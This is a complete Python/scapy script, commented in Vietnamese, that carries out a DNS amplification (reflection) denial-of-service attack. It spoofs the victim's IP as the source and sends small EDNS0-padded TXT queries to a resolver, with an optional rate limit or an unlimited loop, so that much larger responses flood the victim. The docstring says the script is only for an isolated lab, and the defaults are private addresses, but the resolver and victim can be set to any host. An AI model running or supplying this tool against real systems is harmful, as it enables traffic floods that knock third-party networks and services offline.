#!/usr/bin/env python3
"""DNS Amplification (reflection) - chi dung trong lab co lap.

Khac cac flood truc tiep: KHONG ban thang vao victim. Thay vao do gui query DNS NHO toi
RESOLVER, nhung GIA MAO source = IP victim -> resolver doi phan hoi LON ve victim (khuech dai).
Query dung EDNS0 (OPT, bufsize lon) de resolver tra phan hoi UDP lon thay vi truncate.
"""
import argparse, random, time
from scapy.all import IP, UDP, DNS, DNSQR, DNSRROPT, RandShort, conf

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("resolver", help="IP cua DNS resolver/reflector (vd 172.30.0.30)")
    ap.add_argument("--victim", default="172.30.0.10",
                    help="IP victim bi GIA MAO lam source -> phan hoi doi ve day (mac dinh 172.30.0.10)")
    ap.add_argument("--qname", default="amp.lab", help="ten mien hoi (reflector tra TXT lon cho ten nay)")
    ap.add_argument("--qtype", default="TXT", help="loai ban ghi hoi (TXT cho phan hoi lon)")
    ap.add_argument("--bufsize", type=int, default=4096,
                    help="EDNS0 UDP buffer quang cao -> resolver duoc phep tra phan hoi UDP lon")
    ap.add_argument("-c", "--count", type=int, default=0, help="so query, 0 = vo han")
    ap.add_argument("--pps", type=int, default=0,
                    help="gioi han query/giay (0 = toi da). Moi query khuech dai ~40x o victim")
    args = ap.parse_args()

    # Tai su dung MOT socket L3 (giong syn/udp flood) -> nhanh hon goi send() moi lan.
    sock = conf.L3socket()
    interval = 1.0 / args.pps if args.pps > 0 else 0.0
    next_t = time.perf_counter()

    sent = 0
    print("[*] DNS amplification: query '%s %s' -> resolver %s | spoof src=%s (victim) | bufsize=%d" % (
        args.qname, args.qtype, args.resolver, args.victim, args.bufsize))
    try:
        while args.count == 0 or sent < args.count:
            # src = victim (gia mao) -> resolver tra phan hoi lon ve victim.
            pkt = IP(src=args.victim, dst=args.resolver) / UDP(sport=RandShort(), dport=53) / DNS(
                id=random.randint(0, 65535), rd=1,
                qd=DNSQR(qname=args.qname, qtype=args.qtype),
                arcount=1, ar=DNSRROPT(rclass=args.bufsize))   # EDNS0: cho phep phan hoi UDP lon
            sock.send(pkt)
            sent += 1
            if interval:
                next_t += interval
                delay = next_t - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
            if sent % 500 == 0:
                print("[*] sent %d query" % sent)
    except KeyboardInterrupt:
        pass
    finally:
        try: sock.close()
        except Exception: pass
    print("[*] done, tong query: %d (phan hoi khuech dai doi ve %s)" % (sent, args.victim))

if __name__ == "__main__":
    main()
